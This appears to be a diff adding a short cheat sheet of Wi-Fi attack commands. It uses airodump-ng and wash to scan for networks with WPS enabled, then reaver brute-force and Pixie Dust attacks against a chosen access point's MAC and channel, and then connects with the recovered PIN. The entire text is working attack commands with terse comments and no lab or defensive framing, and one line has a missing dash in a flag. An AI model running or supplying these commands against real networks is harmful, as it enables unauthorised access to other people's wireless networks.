@@ -1,0 +1,5 @@
+airodump-ng wlan0mon --wps
+wash -i wlan0mon (scan for all wifi with opened wps)
+reaver -i wlan0mon -b MAC -c CHANNEL -d 150 -vvv(delay)
+reaver -i wlan0mon -b MAC -c CHANNEL -K 1 -f(fixed channel) -vvv( pixiedust attack )
+reaver -i wlan0mon -b MAC c CHANNEL  -p pin (after finding the pin)
